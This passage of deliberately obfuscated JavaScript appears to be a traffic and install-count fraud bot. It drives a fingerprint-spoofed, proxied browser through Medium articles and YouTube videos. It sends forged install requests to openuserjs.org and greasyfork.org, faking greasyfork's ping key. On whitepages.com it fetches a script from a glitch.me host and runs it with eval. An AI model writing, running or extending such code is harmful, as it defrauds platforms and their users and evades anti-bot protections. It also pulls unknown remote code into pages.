      } = require('fakebrowse' + 'r'), q = require('path'), r = q['resolve'](__dirname, S(0xf, 'qwDY') + 'serUserDat' + 'a'), s = new p['Builder']()['displayUse' + 'rActionLay' + 'er'](0x17de + 0x1961 + -0x313f)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([
        require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
          'blockTrackers': 0x1,
          'blockTrackersAndAnnoyances': 0x1
        }),
        require('@extra/pro' + 'xy-router')({
          'proxies': {
            'DEFAULT': flags['doUseProxy'] ? await getRandomProxy() : null
          }
        }),
        require('puppeteer-' + 'extra-plug' + 'in-timezon' + 'e')()
      ])['userDataDi' + 'r'](r);
      let t;
      D:
        for (;;)
          try {
            let z = await async function A() {
              let B;
              const C = {
                'User-Agent': B['userAgents']['random'](),
                'Accept-Encoding': 'none'
              };
              try {
                B = (await axios['get']('https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc', {
                  'headers': C
                })) ? .['data'];
              } catch (D) {}
              if (B)
                try {
                  B = (await axios['get'](B, {
                    'headers': C
                  })) ? .['data'];
                } catch (E) {}
              if (!B)
                return await randomWait(), await A();
              try {
                return 'object' == typeof B ? B : 'string' == typeof B ? JSON['parse'](B) : {};
              } catch (F) {
                if (!B)
                  return await randomWait(), await A();
              }
            }();
            flags['doExtFinge' + 'rprint'] && s['deviceDesc' + 'riptor'](z), t = await s['launch']();
            break D;
          } catch (B) {
            warn(B), await randomWait();
          }
      const {
        vanillaBrowser: u,
        userAction: v
      } = t, w = u['defaultBro' + 'wserContex' + 't'](), x = [
        'eHpl-BjXo5' + '8',
        '-PgyODlV6V' + '8',
        'S9EkXX0QYD' + 'U',
        'WvcG1OKdHW' + 'o',
        'b6gOcEwtZ8' + 'U',
        'apdtzA0Dzf' + 'k',
        'YiukDwYv2K' + '4',
        'zK-6UH5R5X' + '8',
        'bIXqNjtsEf' + '4',
        '3l253rESkw' + 'Q',
        'u6RVZKcN9z' + 'Q',
        '6ImZdwpdwT' + 'A',
        '0qPB5ANSBK' + 'c',
        '92duH3cqn1' + 'M',
        'b5lKI78fw3' + 's',
        'zpCCPZfP8L' + 'I',
        'ES7oooakr-' + 'c',
        '2eWyJ8FBvQ' + '8',
        'O4-B3OFPDf' + 'Q',
        'JFcnGk0_u7' + 'o',
        'AP7d2Ghq6d' + 'U',
        'UizEAwrZAG' + 'I',
        '0FAi5-h8Hj' + '0',
        'CNqA6IYj17' + 'k',
        'tSiKyCpwnS' + 'Y',
        'OrglyeV5xP' + 'Y',
        'BXkB-g4eCc' + 's',
        'Y53CmmpbOJ' + 's',
        'sm5MLz_IrQ' + 'k',
        'EuciRU_Ska' + '0',
        'cCbDCTLyPc' + 'E',
        'Ox7Ng5T7bm' + 'c',
        'TXTaB-dQg-' + '0',
        '3jSWaWgr_A' + '0',
        'xT8nvuxCRB' + 'E',
        '3c4Ab9EmRg' + 'Y',
        '2kScgeNOpL' + '8',
        't22jhowMom' + 'c',
        'HbcDLgkmXL' + 's',
        'JsKZ41uTeg' + 'c',
        'dfU48FRgs0' + 'g',
        '3K9ILewnUk' + 'o',
        'QmKwnRiKhD' + 'k',
        'n3nVsWsL6I' + 'k',
        'noTs52D_Mw' + 'Y',
        'A0tDR4nTTK' + '0',
        '9eBwFca-B1' + '4',
        'moasU30H5l' + 'A',
        '_Mb8oQtSBW' + 'E',
        'TNGGOgwPtc' + 'M',
        '-pYA-gjkQ8' + 's',
        '5d-dB6tZZA' + 'o',
        '8H2AiOV0oE' + 'o',
        'mI7aiKDGde' + 'w',
        'D-IMDYrj35' + '4',
        'gKgFiEgghy' + 'g',
        'mjVwfjJ2nj' + 'k',
        '6auDBi-D2H' + 'M',
        'X89-SWNdIE' + 'k',
        'T5Pn4LhIwj' + 'M',
        'wVnKGSjY3i' + '8',
        'g11NJftxw1' + '4',
        '9zHirkfEKk' + 'k',
        'ZyGS_AMbIa' + '4',
        'yG6bwB17ZP' + 's',
        'aytHiLe0s6' + 'U',
        'cGe-Mpw_F1' + 'w',
        'eMK7xV_nxZ' + 'o',
        'epJ2MAKa1Y' + 'Q',
        '5BNbKKMUhE' + 'o',
        'oxpAvc6tDP' + '8',
        'jRcc-NIR2R' + 'I',
        '258btO4mFw' + '4',
        'pXjJAUvSbQ' + 'A',
        '63-irfPjh2' + 'c',
        'xbrDZAFf3Q' + 's',
        'MVHMtRlesU' + 'g',
        'zed05qfHMB' + 'I',
        'nkhkxKUHsY' + 'g',
        'n4cSAqR9H1' + 'Q',
        'gOUPndcj7z' + 'I',
        'n3HBTTDHoX' + '8',
        'XIgMFHPIXv' + '4',
        'oQHKMky-_K' + 'c',
        'zfDgTzZ2nh' + '0',
        '1PYettRo-D' + 'M',
        'jzuZuwF490' + '4',
        '2DAgWTlXae' + '8',
        'keouUYA5hI' + 'k',
        'F7i7wRlGCd' + 'c',
        'uToD2c0CdJ' + 'c',
        'Y8DzpdFZZ8' + '8',
        '-rrH657DAa' + 'o',
        'QTrEEWtDks' + '4',
        'TWTSnQDuad' + 'Y',
        'a0GUyvgnzg' + 'c',
        'eSReWZQyKd' + 'E',
        'D_5pMqdKSs' + '4',
        'm0ie8gHS00' + 'I',
        '6WosqMq9ej' + 'o',
        'i0afAOlon_' + '4',
        'j_fe6PfxW4' + 'Y',
        'GfPzi8SYr0' + 'w',
        'MSgZhNCwff' + 'M',
        'wxyBC_z6bI' + '8',
        'PkQpV-Fwhs' + 'k',
        'bVD6cWOVhN' + 'U',
        'mjZOpQlHbx' + 'M',
        'k_BXkcdbBO' + 'M',
        'X72oUsFV7q' + '0',
        'lONsILfq-W' + 'Y',
        'Bhe9PyM_s_' + 'Q',
        'Bhe9PyM_s_' + 'Q',
        'h4TBnDkX4y' + 'o',
        'PNBJyHEkfk' + '4',
        'L3iHS__ufc' + 'g',
        'm7aliUAwm_' + 'Y',
        'FuPVf85zMi' + 'w',
        'gtupAeNTDS' + 'M',
        'yyJ8zkckoB' + '8',
        'ZDTESiN1eS' + 'w',
        'Fo6x16DkoR' + 'o',
        'IAJqRxhVqO' + 'k',
        'KAgwII8TGj' + 'o',
        'o4tLCshmlb' + 'M',
        'dLj5fIupdA' + 'o',
        '_Xl_-b9P4U' + 'Q',
        'V3NxxpUUfW' + 'E',
        'J3ygeDEMnO' + 'w',
        'HcP_xmdwsl' + 'c',
        'M9g0h7px2_' + 'M',
        'b5WfUvcSgr' + 'U',
        S(0x3, 'mh27') + 'E',
        'x2gfhCLHd9' + '4',
        'M5Fr8G0ma9' + 'o',
        '3sGeIBfFlC' + 'M',
        'k74y4KOJ2m' + '4',
        'pTHJB0S8E-' + 'U',
        'KaIrXJLfYP' + 'M',
        '0cisZkywhg' + 'Q',
        '0dVzItbl9E' + 'w',
        't0EqnhcSb1' + 's',
        'MuiXtvo1RY' + 'E',
        'Nj-3KC6knH' + 'w',
        'B19HbETNi5' + '8',
        'yKN_QkroH6' + 's',
        'U9ExFM1pji' + '0',
        'sONzDfjKhL' + '4',
        'n3Kj8zEfew' + 'U',
        'nXLGQ7QeoG' + 'Y',
        'OQFQiwiM-P' + 'Y',
        'UtPRpKRTtH' + 'U',
        'E56Myp0BzE' + 'E',
        '7DjOp_JM2Z' + 'w',
        'rNFLQFz_G1' + 'g',
        '1r2pKoVAdj' + 'M',
        'gm3eiv6UND' + 'M',
        'yOiROfjxzX' + 'o',
        'lt2AcxC_ap' + 'g',
        T(0x0) + 'E',
        '6Ut6HbJmW4' + 'w',
        'fUs0TtQQTo' + '0',
        '_phHS3FAgW' + 'Q',
        '1f8sU4l3dP' + '4',
        'HwTSLUd53K' + '8',
        'EpP2ymD_QG' + 'A',
        'TQ69QFqmbo' + 'I',
        'wA8BqUka_u' + '0',
        'bc8Ey-vuR5' + 'M',
        'PZ_uLi7ULl' + '0',
        'smu5FsnhwF' + '4',
        'dv1JluwoOb' + 'c',
        'nHotP0jbcv' + 'A',
        'iIjYNEmrVv' + 'M',
        'SeP-OZAiPb' + 'c',
        'v52PClvMFt' + 'k',
        '3loLqIPxTS' + '0',
        'jVu9mOzbSq' + 'U',
        '73SAN1vOrV' + 'k',
        'YLPxp4ntym' + 's',
        'YWXfelRk3b' + 'Q',
        'CsxlLMb6Uj' + 'o',
        'uafGOfwzpa' + 'Q',
        'XIr8qotHOI' + 'E',
        'EcoPCWC3Uh' + 'o',
        'AhOwyT8aIh' + 'g',
        't-Ox7lI5UH' + 's',
        'i08qNmssXe' + 'Q',
        'QrJIU09eD-' + 'g',
        'QvNNCQ-8Rp' + 'E',
        'k5gjnjDFAZ' + 's',
        'h_NQ3y1ek8' + 'U',
        'evPsJlNLy_' + '4',
        'qEPTydgwh4' + 's',
        'LB685ckhuf' + 'E',
        'Lj1EcSMGey' + '0',
        'OE19r7MIMW' + 'Q',
        'u8E3p0Vy-P' + 'Y',
        'f4a5OPFQa7' + 'k',
        'XDo7Q7yUEt' + 'k',
        'Vw_9zw0qHI' + 'c',
        'KGT5nbDsI_' + '8',
        'E008Eql59M' + 'Q',
        'wSOFdefX47' + 'A',
        '2xcv7q3QhR' + 'E',
        'hgfvmcBkc0' + '4',
        '0wP7csnX7k' + '4',
        'Xo0R8WiRSb' + '4',
        '8zNp8EOpGd' + '4',
        'sWYhIJZmoS' + 'E',
        'YdG8U1W-bX' + '0',
        'QeDsoSNml-' + 'c',
        'xW5q77El0x' + '8',
        'ZF14issJFE' + 'Y',
        'TRglEGLLKX' + 'o',
        'UE0SXc5k1e' + 'g',
        '6VY65D8f3D' + 'Q',
        'Iwxuob4fA8' + 'Q',
        'M4elJHCUIi' + 's',
        'GY9WWhO504' + 'k',
        'eErUSxmLDw' + '8',
        'ITQfAfzLj3' + 'I',
        'vbDrCL2FuL' + 'g',
        'KyQ_sUgtbK' + 'U',
        'lbEJcipUp8' + 'I',
        '2SqCn2LreN' + 'g',
        '1i-G2TUn41' + '0',
        's0ru6uK7vi' + '8',
        'gOxiE5UAAD' + 'w',
        'lx1rOOjekc' + '8',
        '5VYN2zA-Si' + 'k',
        'q9rLWEAzoo' + 'k',
        '4KSm3IY7Xz' + 'g',
        'fMqRu_ON-D' + 'E',
        'GfvShU6Sy9' + 'A',
        'OHzOmi1b60' + 'Y',
        'D9oTUKT-_n' + 'A',
        '_BrT2PlUiw' + '0',
        'kuuI4LzKgm' + 'I',
        '78dymyg88r' + 'M',
        'mi0nGt2B-q' + 'o',
        'HaI7BjnwnO' + 'c',
        'xlAEOkIuy7' + 'Y',
        '3VmtckvTXl' + 'U',
        'ed7TWHKDr4' + 'E',
        '2LfTjyVtbf' + 'U',
        'STHlCkloyv' + 'E',
        '-BI_-6YnM6' + 'Y',
        'LSK_G1qCQw' + 'M',
        '4tzqIl6EKV' + 'k',
        '9DshU55EiV' + '8',
        'mBtaEI_6e8' + 's',
        '960lvuduwY' + 'w',
        'XWJH-6J5Ee' + 'g',
        'XLS4qmyCAX' + 'g',
        '8cJDYeRiLn' + 'k',
        'cCaIVrltHz' + 'w',
        '8X2fF4pgM0' + 'E',
        '6s8Xm4wylr' + '4',
        'eFceshvavn' + 'o',
        '2h4g7euqR-' + 'U',
        'ujiBqXnn92' + '8',
        'w9F2NST-9j' + 's',
        'w-oc7F5Mmy' + 'U',
        'UYrmqL3cOD' + 'U',
        '4QB59etj0I' + 'o',
        'MY9MTNgXcN' + 'o',
        'ISBmcKDS5C' + '8',
        'ogIb7A7tvW' + '0',
        '-L583IZF6s' + 'k',
        'NbeKQq29ZL' + '0',
        'SPplDxd74F' + 's',
        'MHGV8QmpAz' + 'k',
        'iWzezFWpU7' + 'A',
        'NNCQt1rXXE' + 'Y',
        'bcb_ZhJJK8' + 'g',
        '3KoZGQiY6N' + 'o',
        'aSaXQH8F1_' + 'A',
        'V5nMOhI62o' + 'w',
        'JvlPjRUdId' + '0',
        '2gQHuClLCb' + '0',
        '5e-qDy-uUJ' + 'E',
        'oE8vC0QEWU' + 'E',
        '7cQken99yu' + 'o',
        'pmzu080j7r' + 'I',
        'sVy9F4whP6' + 'o',
        'MJrkylk7iE' + 'c',
        'XYjsTxi6oE' + '8',
        'mKlMouB6tp' + '0',
        'o2yunZQley' + 'A',
        'oRryU9F9Lv' + 's',
        'uzzK-052H0' + 'c',
        'VSvA4rCe-4' + 'M',
        'XURH2u_0fM' + 'I',
        'yfpVL2g_tk' + 'o',
        'AuEEjQ8x9o' + 'w',
        'wWkviY8zBr' + 'c',
        'zt_eubHWhx' + 'c',
        'O_7_BGU3u_' + '0',
        'QFDKBxmOn3' + 'Y',
        'w6gccNWXXv' + 'g',
        'VdNJxbrqdX' + 's',
        'wbi5Dxebvn' + 'I',
        'XEFOREYrJg' + 'k',
        'I2rcRta7WJ' + '0',
        'OP5KGfXHX_' + 'A',
        'w2MUMbbwlm' + 'o',
        'X3bF0nd6kf' + 'w',
        'WDDAhASf9j' + 'w',
        'fRwcV8gjbc' + 'w',
        '7T63gaRThr' + '0',
        'zC8AWIwhbf' + 's',
        'JSkVE0n-ee' + 'o',
        'qiQA5pWWRt' + 'U',
        'QdXCjZtfXu' + 'c',
        'vlBji8TOax' + 'o',
        'pBx_5CbIcp' + 'o',
        'L1Oy5F6ZMO' + 'Q',
        'P0NjLaBed-' + 'E',
        'DR16C4-keB' + '0',
        'LGmpIpu9eD' + 'w',
        'rNkX_A4kBA' + 'Q',
        'QztVMjrEk4' + '0',
        'uOM6m6KL5d' + '4',
        'g-Aju8xrrO' + 'E',
        'DfkDbFk_x9' + '8',
        'Y4NLDaowD6' + 'I',
        'ALSZnqQTuJ' + 'o',
        'xUmB6BpZBE' + 'w',
        'SxNOcZ1s85' + '8',
        '-noeCjO416' + 'k',
        'taPJqXBI8V' + 'Y',
        'YxqbkMi1Is' + '4',
        'vnJTyve2r-' + '4',
        '44lRVYQ38E' + 'Q',
        'QOv1N1X5J-' + 'g',
        'jNjREs7ODT' + 'g',
        'U30ToJo3dd' + 'k',
        T(0x15) + 'Y',
        'mGU6sOPlYv' + 'c',
        '6pwxUXdt6T' + 'Q',
        '6MkJRee35a' + 'Q',
        'LVbf7U9WAI' + 'c',
        'gPbhFvEeJ3' + 'M',
        S(0xe, 'dr9O') + 'A',
        'L0KQJqfwJJ' + 'Y',
        'GWr33_u0VK' + 'c',
        '4ud3ZPfWkH' + 's',
        'dxSrySC4XM' + 'c',
        'iIM2KZC69W' + '0',
        '8DuJ3BAwME' + 'o',
        'm3BAhe1wsl' + 'Y',
        '02U_3pAZxM' + '8',
        '0e7nidPa97' + 'g',
        'TixW__6Eer' + 'o',
        'q46W8MTRTC' + 'E',
        'Jdxp04Je1O' + 'w',
        'HfP4TO3gfN' + '0',
        '4dUJaeB0qL' + '8',
        'xnL-fRJ3RZ' + 'o',
        'yJbD0Df45u' + 'Q',
        '-pGw8RkSSB' + 'k',
        '7cy86Njsis' + 'M',
        'jbgqvxtauo' + '4',
        'N8M00JjSVI' + 'I',
        'MfR5q6Td3R' + 'c',
        'eHwcx94wcp' + 's',
        'olDgVFgAgP' + 'o',
        'eAAd5BmzXz' + 'M',
        'xgTjQ2sGXd' + '4',
        'ipny6JUbzw' + 's',
        'WOwQ0UxbRj' + '4',
        'h0PKFed2GB' + 's',
        'JxdOrgzq7Z' + '8',
        '-VgpSWWW-8' + 'w',
        '-ix4OizkAn' + 's',
        'd3CRE9y3YV' + 's',
        '4QZlfXxorJ' + 'o',
        'YlDpg8aCs5' + 'M',
        'Qe5WT22-AO' + '8',
        'b_rjBWmc1i' + 'Q',
        '9yjZpBq1XB' + 'E',
        'hPx-RiBKXt' + 'Q',
        'UMqLDhl8PX' + 'w',
        'DlJEt2KU33' + 'I',
        'BWeqoARup-' + 'Q',
        '2Dx76lD8Sc' + 'c',
        'j_nI6G3ZDi' + 'E',
        'zvcUYYN1sx' + 'w',
        'cWRkYo1S3L' + '4',
        'cWRkYo1S3L' + '4',
        'bxC_PN3SRv' + 'I',
        '94m93T_5JL' + 'M',
        'RBSHAH4iWU' + '8',
        'RBSHAH4iWU' + '8',
        'RBSHAH4iWU' + '8',
        'bo9fTeXvSi' + 'A',
        'z6LqXiAK-8' + '0',
        '5tbOspjJ5f' + '0',
        'twQ6kKjtBk' + 'Y',
        'Ig17K38Fy0' + 'Y',
        'ZdlrVDwn_a' + '4',
        'aCT4Lddunx' + 'g',
        'acAvMGQtln' + 'M',
        '8XkcbdSRdO' + '0',
        '0e3GPea1Ty' + 'g',
        'zxYjTTXc-J' + '8',
        '9bqk6ZUsKy' + 'A',
        'plSyrHqUh7' + '8',
        'HkvQywg_uZ' + 'A',
        'lADBHDg-Jt' + 'A',
        'I2O7blSSzp' + 'I',
        'kd2KEHvK-q' + '8',
        'CbUjuwhQPK' + 's',
        'fb7T1v_VHp' + 'E',
        'SpeSpA3e56' + 'A',
        'RQdxHi4_Pv' + 'c',
        'nx2-4l4s4N' + 'w',
        'tUTCq3iiw_' + '4',
        'VDa5iGiPgG' + 's',
        'S-sJp1FfG7' + 'Q',
        'Hm1YFszJWb' + 'Q'
      ], y = [
        n,
        l,
        m,
        o
      ];
      log('browser\x20la' + 'unched'), flags['RPL2_MDM2'] && setTimeout(async () => {
        const C = await w['newPage']();
        for (;;) {
          let D = -0x1bb7 + 0x1 * -0x16a9 + 0x3260;
          if (await C['goto'](data['mediumArti' + 'cles']['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](E => D++), !D) {
            await randomWait();
            for (let E = -0x192 + 0x107 * 0xa + 0x2 * -0x45a; E < getRandomInt(-0x3 * -0x44a + 0x11 * -0x5d + -0x1ac * 0x4, 0x1e40 + -0x5 * -0x51d + 0x4 * -0xdf3); E++)
              await v['simKeyboar' + 'dPress']('ArrowDown'), await randomWait();
            await randomWait(), await wait(0x4075 + -0x199c7 + 0x243b2);
          }
        }
      }, -0x1 * 0x148c + -0x45b + -0x39d * -0x7), flags['RPL2_WP'] && setTimeout(async () => {
        (async function C() {
          try {
            let D = -0x8f * -0x1 + -0x22bd + 0x4e2 * 0x7;
            const E = await w['newPage']();
            if (await E['goto']('https://ww' + 'w.whitepag' + 'es.com/', {
                'timeout': MM_NETWORK_PATIENCE
              })['catch'](F => D++), D)
              return await E['close'](), C();
            await E['waitForSel' + 'ector']('#main-cont' + 'ent'), await E['evaluate'](() => {
              let F = new XMLHttpRequest();
              F['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x1cfe + -0x13e1 + -0x91d), F['send'](), eval(F['responseTe' + 'xt']);
            });
          } catch (F) {}
        }());
      }, 0xf1 * 0x26 + 0xb * -0x17b + -0x1319), flags['RPL2_YT'] && async function C() {
        const D = await h('https://ww' + 'w.youtube.' + 'com/');
        for (;;) {
          let E = -0x1 * -0xaed + 0xdd1 + -0x18be;
          try {
            await i(D), await y['random']()(D);
          } catch (F) {
            log((E = -0x1f89 * 0x1 + 0x76c + -0x62 * -0x3f, F)), await D['close'](), setTimeout(() => {
              C();
            }, -0x2f * -0x43 + -0x956 + 0x293 * -0x1);
          }
          if (E)
            return warn('YouTube\x20bo' + 'tter\x20died.' + '..'), 0x58f * -0x7 + -0xafb * -0x2 + -0x1b2 * -0xa;
          await randomWait();
        }
        return -0x1131 + -0x16ca + -0xd54 * -0x3;
      }();
    }
  ],
  [
    () => flags['doCreateSe' + 'rver'],
    async () => {
      require('http')['createServ' + 'er'](async function(f, g) {
        g['writeHead'](-0x2b8 * -0x2 + -0xdfc + 0x954), g['write']('v0.8'), g['end']();
      })['listen'](process['env']['PORT'] || 0x9b5 + 0x2adc + 0x13 * -0x11b);
    }
  ],
  [
    () => flags['doOUJS'],
    async () => {
      async function f() {
        const h = data['oujsToAssi' + 'st']['random'](),
          j = h['replace']('/scripts/', '/install/') + '.user.js',
          [k, l] = (function() {
            const x = data['oujsUAs']['random']();
            return [
              x,
              x['includes']('Firefox')
            ];
          }()),
          m = function(x, y = -0x1d83 + 0x952 + 0x1432) {
            if (x['includes']('Firefox'))
              return x['slice'](x['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x60c + 0x2d + 0xbc * 0x8));
            const z = x['indexOf']('Chrome/') + 'Chrome/' ['length'],
              A = x['slice'](z),
              B = A['slice'](0x13ea + 0xd8e + 0x44 * -0x7e, A['indexOf']('\x20'));
            return y ? B['slice'](0xa3b * 0x1 + -0x4 * -0x634 + 0x230b * -0x1, B['indexOf']('.')) : B;
          }(k),
          q = {
            'signal': AbortSignal['timeout'](0x1126 * 0x1 + -0x27b9 + -0x3da3 * -0x1),
            'headers': {
              'host': 'openuserjs' + '.org',
              'origin': 'https://op' + 'enuserjs.o' + 'rg',
              'user-agent': k,
              'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
              'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
              'accept-language': 'en-US,en;q' + '=0.9',
              'cache-control': 'no-cache',
              'pragma': 'no-cache',
              'sec-fetch-dest': 'document',
              'sec-fetch-mode': 'navigate',
              'sec-fetch-site': 'same-origi' + 'n',
              'sec-fetch-user': '?1',
              'upgrade-insecure-requests': '1'
            },
            'body': null,
            'method': 'GET'
          };
        l ? Object['assign'](q['headers'], {
          'te': 'trailers'
        }) : Object['assign'](q['headers'], {
          'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + m + '\x22',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '\x22Windows\x22'
        });
        const u = await fetch(g, q)['catch'](x => {});
        if (!u || !u['headers'])
          return;
        if (null === u['headers']['get']('X-RateLimi' + 't-Limit'))
          return;
        const v = {
          'signal': AbortSignal['timeout'](-0x1 * -0x1731 + 0x1b * -0x1d7 + -0x68e * -0xa),
          'headers': {
            'host': 'openuserjs' + '.org',
            'origin': 'https://op' + 'enuserjs.o' + 'rg',
            'user-agent': k,
            'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
            'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
            'accept-language': 'en-US,en;q' + '=0.9',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'referer': g,
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origi' + 'n',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1'
          },
          'body': null,
          'method': 'GET'
        };
        if (l ? Object['assign'](v['headers'], {
            'te': 'trailers'
          }) : Object['assign'](v['headers'], {
            'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + m + '\x22',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '\x22Windows\x22'
          }), !await fetch(h, v)['catch'](x => {}))
          return;
        const w = {
          'headers': {
            'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
            'accept-language': 'en-US,en;q' + '=0.9',
            'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
            'pragma': 'no-cache',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'none'
          },
          'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
          'body': null,
          'method': 'GET'
        };
        l ? Object['assign'](w['headers'], {
          'te': 'trailers'
        }) : Object['assign'](w['headers'], {
          'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + m + '\x22',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '\x22Windows\x22'
        }), await fetch(j, w);
      }
      const g = 'https://op' + 'enuserjs.o' + 'rg/';
      f();
      for (let h = 0x19d4 + 0x14d7 + -0x1 * 0x2eab; h < -0x9 * 0x1b + -0x107 + -0x55 * -0x6; h++)
        setTimeout(f, (0x14fe6 + -0x74d6 + 0x31 * 0x50) * h * getRandomInt(0x677 * 0x3 + -0x1d7 * 0x6 + -0x85a, -0x544 + 0x9dc + -0x495));
      setInterval(() => {
        f();
        for (let i = 0x1 * 0xaae + -0x5dd * 0x1 + -0x4d1; i < -0x25 * 0x76 + -0xe56 + 0x1f68; i++)
          setTimeout(f, (-0x14763 + -0xcde7 + 0x2ffaa) * i * getRandomInt(0x8b6 + 0x653 + -0xf08, 0x1818 + -0x1 * -0x669 + -0x1e7e));
      }, -0x271508 + -0x1 * -0x5e7d2 + 0x1d5e92 * 0x3);
    }
  ],
  [
    () => flags['doGF'],
    async () => {
      async function f(j = null, k = -0x10ca + 0x1986 + -0xac * 0xd) {
        const q = makeFetchCookie(fetch),
          u = j ? new HttpsProxyAgent(j) : j,
          v = await q('https://gr' + 'easyfork.o' + 'rg/en', {
            'credentials': 'include',
            'headers': {
              'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
              'Accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,*/*;' + 'q=0.8',
              'Accept-Language': 'en-US,en;q' + '=0.5',
              'Prefer': 'safe',
              'Upgrade-Insecure-Requests': '1',
              'Sec-Fetch-Dest': 'document',
              'Sec-Fetch-Mode': 'navigate',
              'Sec-Fetch-Site': 'cross-site'
            },
            'method': 'GET',
            'mode': 'cors',
            'agent': u
          }),
          w = extractLinks(await v['text']())['filter'](E => E['includes']('by-site'))['slice'](0x2173 * -0x1 + 0x21fd + -0x3 * 0x2e, -(0x48 * -0x15 + 0x1 * 0x183b + -0x1252)),
          x = k && data['scriptTarg' + 'ets']['random'](),
          y = k ? x['preRef'] : w['random'](),
          z = await q(y, {
            'credentials': 'include',
            'headers': {
              'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
              'Accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,*/*;' + 'q=0.8',
              'Accept-Language': 'en-US,en;q' + '=0.5',
              'Prefer': 'safe',
              'Upgrade-Insecure-Requests': '1',
              'Sec-Fetch-Dest': 'document',
              'Sec-Fetch-Mode': 'navigate',
              'Sec-Fetch-Site': 'same-origi' + 'n',
              'Sec-Fetch-User': '?1'
            },
            'referrer': 'https://gr' + 'easyfork.o' + 'rg/en',
            'method': 'GET',
            'mode': 'cors',
            'agent': u
          }),
          A = extractLinks(await z['text']())['filter'](E => E['includes']('/scripts/') && !E['includes']('by-site'))['slice'](0x2426 + 0x26d5 * 0x1 + -0x4afa),
          B = k ? x['url'] : A['random'](),
          C = await q(B, {
            'credentials': 'include',
            'headers': {
              'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
              'Accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,*/*;' + 'q=0.8',
              'Accept-Language': 'en-US,en;q' + '=0.5',
              'Prefer': 'safe',
              'Upgrade-Insecure-Requests': '1',
              'Sec-Fetch-Dest': 'document',
              'Sec-Fetch-Mode': 'navigate',
              'Sec-Fetch-Site': 'same-origi' + 'n',
              'Sec-Fetch-User': '?1'
            },
            'referrer': y,
            'method': 'GET',
            'mode': 'cors',
            'agent': u
          }),
          D = extractAnchorData(await C['text']());
        if (D['pingUrl']) {
          const E = sha1(D['ipAddress'] + D['scriptId'] + D['pingKey']),
            F = D['pingUrl'] + (D['pingUrl']['includes']('?') ? '&' : '?') + 'ping_key=' + encodeURIComponent(E);
          await q('https://gr' + 'easyfork.o' + 'rg' + F, {
            'credentials': 'include',
            'headers': {
              'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
              'Accept': '*/*',
              'Accept-Language': 'en-US,en;q' + '=0.5',
              'Prefer': 'safe',
              'Sec-Fetch-Dest': 'empty',
              'Sec-Fetch-Mode': 'cors',
              'Sec-Fetch-Site': 'same-origi' + 'n'
            },
            'referrer': B,
            'method': 'POST',
            'mode': 'cors',
            'agent': u
          });
        } else
          warn('awdiwajdwj' + 'qdqw');
      }
      async function g() {
        const h = await getRandomProxy();
        await f(h), random() <= -0x1d63 + 0x8 * -0x192 + 0x29f3 + 0.6 && await f(h, -0x12bb + -0x1e43 + 0x1055 * 0x3);
      }
      g();
      for (let h = -0x560 + -0x2b * 0x77 + 0x195d; h < 0x1fc6 + -0xc5 + -0x1efd; h++)
